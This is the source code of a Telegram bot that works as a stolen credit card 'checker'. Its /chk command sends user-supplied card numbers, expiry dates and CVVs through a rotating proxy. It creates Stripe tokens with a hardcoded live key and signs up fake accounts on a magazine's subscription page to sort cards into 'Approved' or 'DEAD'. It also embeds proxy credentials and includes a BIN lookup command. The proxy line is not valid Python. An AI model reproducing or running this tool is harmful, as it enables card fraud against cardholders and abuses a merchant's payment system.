import logging
import os
import requests
import time
import string
import random
import yaml
import asyncio
import re

from aiogram import Bot, Dispatcher, executor, types
from aiogram.utils.exceptions import Throttled
from aiogram.contrib.fsm_storage.memory import MemoryStorage


# Configure vars get from env or config.yml
CONFIG = yaml.load(open('config.yml', 'r'), Loader=yaml.SafeLoader)
TOKEN = os.getenv('TOKEN', CONFIG['token'])
BLACKLISTED = os.getenv('BLACKLISTED', CONFIG['blacklisted']).split()
PREFIX = os.getenv('PREFIX', CONFIG['prefix'])
OWNER = int(os.getenv('OWNER', CONFIG['owner']))
ANTISPAM = int(os.getenv('ANTISPAM', CONFIG['antispam']))

# Initialize bot and dispatcher
storage = MemoryStorage()
bot = Bot(token=TOKEN, parse_mode=types.ParseMode.HTML)
dp = Dispatcher(bot, storage=storage)

# Configure logging
logging.basicConfig(level=logging.INFO)

# BOT INFO
loop = asyncio.get_event_loop()

bot_info = loop.run_until_complete(bot.get_me())
BOT_USERNAME = bot_info.username
BOT_NAME = bot_info.first_name
BOT_ID = bot_info.id

# USE YOUR ROTATING PROXY API IN DICT FORMAT http://user:pass@providerhost:port
proxies = ca-tor2-smart.serverlocation.co:1080:SDPvWUVBymcWQzC:Il0veUbabe<3


session = requests.Session()

# Random DATA
letters = string.ascii_lowercase
First = ''.join(random.choice(letters) for i in range(6))
Last = ''.join(random.choice(letters) for i in range(6))
PWD = ''.join(random.choice(letters) for i in range(10))
Name = f'{First}+{Last}'
Email = f'{First}.{Last}@gmail.com'
UA = 'Mozilla/5.0 (X11; Linux i686; rv:102.0) Gecko/20100101 Firefox/102.0'


async def is_owner(user_id):
    status = False
    if user_id == OWNER:
        status = True
    return status


@dp.message_handler(commands=['start', 'help'], commands_prefix=PREFIX)
async def helpstr(message: types.Message):
    # await message.answer_chat_action('typing')
    keyboard_markup = types.InlineKeyboardMarkup(row_width=3)
    btns = types.InlineKeyboardButton("Bot Source", url="viet69.in")
    keyboard_markup.row(btns)
    FIRST = message.from_user.first_name
    MSG = f'''
Hello {FIRST}, Im {BOT_NAME}
U can find my Boss  <a href="tg://user?id={OWNER}">HERE</a>
Cmds /chk /info /bin'''
    await message.answer(MSG, reply_markup=keyboard_markup,
                        disable_web_page_preview=True)


@dp.message_handler(commands=['info', 'id'], commands_prefix=PREFIX)
async def info(message: types.Message):
    if message.reply_to_message:
        user_id = message.reply_to_message.from_user.id
        is_bot = message.reply_to_message.from_user.is_bot
        username = message.reply_to_message.from_user.username
        first = message.reply_to_message.from_user.first_name
    else:
        user_id = message.from_user.id
        is_bot = message.from_user.is_bot
        username = message.from_user.username
        first = message.from_user.first_name
    await message.reply(f'''
═════════╕
<b>USER INFO</b>
<b>USER ID:</b> <code>{user_id}</code>
<b>USERNAME:</b> @{username}
<b>FIRSTNAME:</b> {first}
<b>BOT:</b> {is_bot}
<b>BOT-OWNER:</b> {await is_owner(user_id)}
╘═════════''')


@dp.message_handler(commands=['bin'], commands_prefix=PREFIX)
async def binio(message: types.Message):
    await message.answer_chat_action('typing')
    ID = message.from_user.id
    FIRST = message.from_user.first_name
    BIN = message.text[len('/bin '):]
    if len(BIN) < 6:
        return await message.reply(
                   'Send bin not ass'
        )
    r = requests.get(
               f'http://binchk-api.vercel.app/bin={BIN}'
    ).json()
    INFO = f'''
BIN⇢ <code>{BIN}</code>
Brand⇢ <u>{r["brand"]}</u>
Type⇢ <u>{r["type"]}</u>
Level⇢ <u>{r["level"]}</u>
Bank⇢ <u>{r["bank"]}</u>
Phone⇢ <u>{r["phone"]}</u>
Currency⇢ <u>{r["currency"]}</u>
Country⇢ <u>{r["country"]}({r["code"]})[{r["flag"]}]</u>
SENDER: <a href="tg://user?id={ID}">{FIRST}</a>
BOT⇢ @{BOT_USERNAME}
OWNER⇢ <a href="tg://user?id={OWNER}">LINK</a>
'''
    await message.reply(INFO)


@dp.message_handler(commands=['chk'], commands_prefix=PREFIX)
async def ch(message: types.Message):
    await message.answer_chat_action('typing')
    tic = time.perf_counter()
    ID = message.from_user.id
    FIRST = message.from_user.first_name
    try:
        await dp.throttle('chk', rate=ANTISPAM)
    except Throttled:
        await message.reply('<b>Too many requests!</b>\n'
                            f'Blocked For {ANTISPAM} seconds')
    else:
        if message.reply_to_message:
            cc = message.reply_to_message.text
        else:
            cc = message.text[len('/chk '):]

        if len(cc) == 0:
            return await message.reply("<b>No Card to chk</b>")

        x = re.findall(r'\d+', cc)
        ccn = x[0]
        mm = x[1]
        yy = x[2]
        cvv = x[3]
        if mm.startswith('2'):
            mm, yy = yy, mm
        if len(mm) >= 3:
            mm, yy, cvv = yy, cvv, mm
        if len(ccn) < 15 or len(ccn) > 16:
            return await message.reply('<b>Failed to parse Card</b>\n'
                                       '<b>Reason: Invalid Format!</b>')   
        BIN = ccn[:6]
        if BIN in BLACKLISTED:
            return await message.reply('<b>BLACKLISTED BIN</b>')
        # get guid muid sid
        headers = {
            "user-agent": UA,
            "accept": "application/json, text/plain, */*",
            "content-type": "application/x-www-form-urlencoded"
        }

        b = session.get('https://ip.seeip.org/', proxies=proxies).text

        s = session.post('https://m.stripe.com/6', headers=headers, proxies=proxies)
        r = s.json()
        Guid = r['guid']
        Muid = r['muid']
        Sid = r['sid']

        # hmm
        load = {
            "guid": Guid,
            "muid": Muid,
            "sid": Sid,
            "key": "pk_live_oljKIizPrbgI4FSG4XcYnPLx",
            "card[name]": Name,
            "card[number]": ccn,
            "card[exp_month]": mm,
            "card[exp_year]": yy,
            "card[cvc]": cvv
        }

        header = {
            "accept": "application/json",
            "content-type": "application/x-www-form-urlencoded",
            "user-agent": UA,
            "origin": "https://js.stripe.com",
            "referer": "https://js.stripe.com/",
            "accept-language": "en-US,en;q=0.9"
        }

        rx = session.post('https://api.stripe.com/v1/tokens',
                          data=load, headers=header, proxies=proxies)
        token = rx.json()['id']
        LastF = f'************{ccn[-4:]}'

        payload = {
            "subscription_type": "digital",
            "first_name": First,
            "last_name": Last,
            "email": Email,
            "login_pass": PWD,
            "confirm_pass": PWD,
            "shipping_country": "United+States",
            "card_number": LastF,
            "card_cvc": cvv,
            "card_expiry_month": mm,
            "card_expiry_year": yy,
            "action": "register",
            "stripe_token": token,
            "last4": token
        }

        head = {
            "accept": "*/*",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "user-agent": UA,
            "origin": "https://preludemag.com",
            "referer": "https://preludemag.com/subscribe/",
            "accept-language": "en-US,en;q=0.9"
        }

        ri = session.post('https://preludemag.com/subscribe/', data=payload,
                          headers=head, proxies=proxies)
        toc = time.perf_counter()

        if 'success' in ri.text:
            return await message.reply(f'''
✅<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ #ApprovedCVV
<b>MSG</b>➟ {ri.text}
<b>PROXY-IP</b> <code>{b}</code>
<b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
<b>CHKBY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
<b>OWNER</b>: {await is_owner(ID)}
<b>BOT</b>: @{BOT_USERNAME}''')

        if 'incorrect_cvc' in ri.text:
            return await message.reply(f'''
✅<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ #ApprovedCCN
<b>MSG</b>➟ {ri.text}
<b>PROXY-IP</b> <code>{b}</code>
<b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
<b>CHKBY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
<b>OWNER</b>: {await is_owner(ID)}
<b>BOT</b>: @{BOT_USERNAME}''')

        if 'declined' in ri.text:
            return await message.reply(f'''
❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ Declined
<b>MSG</b>➟ {ri.text}
<b>PROXY-IP</b> <code>{b}</code>
<b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
<b>CHKBY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
<b>OWNER</b>: {await is_owner(ID)}
<b>BOT</b>: @{BOT_USERNAME}''')

        await message.reply(f'''
❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ DEAD
<b>MSG</b>➟ {ri.text}
<b>PROXY-IP</b> <code>{b}</code>
<b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
<b>CHKBY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
<b>OWNER</b>: {await is_owner(ID)}
<b>BOT</b>: @{BOT_USERNAME}''')


if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True, loop=loop)
